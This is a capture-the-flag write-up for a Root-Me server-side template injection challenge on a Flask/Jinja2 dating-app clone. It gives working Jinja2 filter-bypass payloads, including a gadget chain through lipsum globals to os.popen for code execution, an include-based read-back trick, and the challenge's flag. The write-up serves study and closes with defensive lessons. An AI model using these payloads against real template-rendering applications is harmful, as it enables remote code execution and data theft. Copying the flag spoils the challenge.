# SSTI - Python - Filter Bypass — writeup

| | |
|---|---|
| **Platform** | Root-Me Pro |
| **Category** | Web — Server-Side Template Injection |
| **Difficulty** | Medium, 450 points, ~1 h |
| **Target** | `https://instance-019fe9d3-…challenges.root-me.pro/` ("RMeet", Flask/gunicorn + Jinja2) |
| **Brief** | *"I have a filter, so I'm safe, right?"* — flag at `/flag.txt` |
| **Flag** | `RM{f4fb91eb42125d167437a61f6a3c1e7e}` |

## Approach

**1. Map the app.** RMeet is a dating-app clone. Register → `/start` (complete profile) →
`/swipe`. Routes: `/swipe`, `/matches`, `/photos`, `/profile/<username>`, `/config.js`
(a *rendered* JS file: `window.myUserId = 10;`), plus `/api/swipe` and `/api/user/<id>`.

**2. Test the obvious sinks — all dead.** Every profile field (`full_name`, `age`,
`gender`, `location`, `bio`, `interests`) was probed with `{{7*7}}`: reflected on the
profile edit form, on the profile *view* section, and on a matched user's profile — always
escaped, never evaluated. Same for a username registered as `{{7*7}}` and for the 404 page.

**3. Reach the hidden feature.** `/profile/<other>` returns *"Accès refusé — vous n'avez
pas encore matché"*, so the matched-only surface was invisible. Bot profiles never like
back, so I used a second account: B likes A via `POST /api/swipe {user_id, direction}`,
then A likes B → `match_created: true`. `/matches` then exposes a route nothing else links
to: **`/messages/<username>`** — a chat form, notably with **no CSRF token**.

**4. Confirm SSTI.** `{{7*7}}` vanished (filtered), but:

```
{% if 1 %}x{% endif %}   -> stored as "x"
{#comment#}              -> stripped
```

Messages are rendered by Jinja **at send time** and the *rendered output* is stored.

## Vulnerability

The chat handler passes the message through `render_template_string()` (unsandboxed) and
"protects" it with a substring blacklist plus a length cap. Both are one-way constraints on
the *source text* — they don't remove the injection.

Blacklist recovered by probing (blocked message = silently dropped):

```
{{  }}  __  self  class  import  system  popen  globals  builtins  mro  flag
cycler  chr  getcwd  +  ()
```

plus: **messages over 150 characters are dropped**, and any message that raises during
render is dropped too (a handy error oracle — `{% set x = 1/0 %}` disappears).

The length cap fooled me for a while: several payloads looked "blacklisted" when they were
merely 160 chars long. Worth measuring the limit before drawing conclusions about a filter.

The blacklist leaks two ways at once:

* **`+` is blocked but `~` isn't.** `~` is Jinja's string-concatenation operator, so every
  banned keyword can be reassembled at runtime: `'glob'~'als'`, `'po'~'pen'`, `'/fl'~'ag.txt'`.
* **`__` is blocked but `_` isn't.** `'_'*2` builds the dunder prefix.

And `{% … %}` statement blocks are untouched — only the `{{ … }}` *output* form is blocked.

## Solution

Gadget chain (each step verified with `{% if … %}MARKER{% endif %}`):

```jinja
lipsum['_'*2~'glob'~'als'~'_'*2]     → jinja2.utils module globals (it does `import os`)
      ['os']['po'~'pen']('cmd')      → RCE
      ['read'](9)                    → read() with an argument, because "()" is blocked
```

`[...]` is used instead of `.attr` because Jinja's `getitem` falls back to `getattr`, and it
is shorter — every character counts against the 150-char budget.

That gives execution, but no **output**: `{{ }}` is blocked, so no expression can be
printed. The way out is `{% include %}`, which *does* work (`{% include 'base.html' %}`
dumped the site's base template). So: have the command drop the flag into Jinja's template
search directory, then include it. The app's cwd contained no `templates/`, so the shell
finds it from a known template name:

**Message 1 — RCE (141 chars):**

```jinja
{% set y=lipsum['_'*2~'glob'~'als'~'_'*2]['os']['po'~'pen']('cp /fl'~'ag.txt $(dirname $(find / -name base.html|head -1))/x')['read'](9) %}GO
```

**Message 2 — read it back:**

```jinja
{% include 'x' %}
```

Rendered result, stored as the chat bubble:

```
RM{f4fb91eb42125d167437a61f6a3c1e7e}
```

Full chain automated in `exploit.py` (registration → forced match → RCE → flag).

## Lessons

- **A denylist over template *source* never stops SSTI.** Jinja can rebuild any banned
  identifier at runtime; blocking `+` while leaving `~` (and `__` while leaving `_`) is the
  whole game. Filter the sink, don't filter the string: render untrusted data as *data*
  (`render_template("x.html", msg=msg)`), never as template source.
- **`{% %}` is as dangerous as `{{ }}`.** Blocking only the output form leaves full
  expression evaluation via `{% set %}`; side effects (RCE) don't need to print anything.
- **When output is blocked, find another channel.** `{% include %}` renders a file's
  contents — pair "write file via RCE" with "include file" and you have a read primitive.
  `{% include %}` also accepts a `Template` object, so `env.from_string('{'*2~…)` is another
  route when the environment is reachable (`url_for.__globals__['current_app'].jinja_env`).
- **Measure hard limits before blaming the filter.** Silent drops had two causes here —
  blacklist *and* a 150-char cap *and* render exceptions. Bisect with plain text first.
- **Recon the state-gated surface.** `/messages/<user>` only appears once you have a match;
  the entire vuln lived behind a feature no unauthenticated crawl or gobuster run would see.
  Two accounts + the swipe API were the way in.
- `jinja2.utils` imports `os`, which makes `lipsum` (defined there) one of the shortest
  paths from a Jinja context to `os.popen` — handy under a length limit.
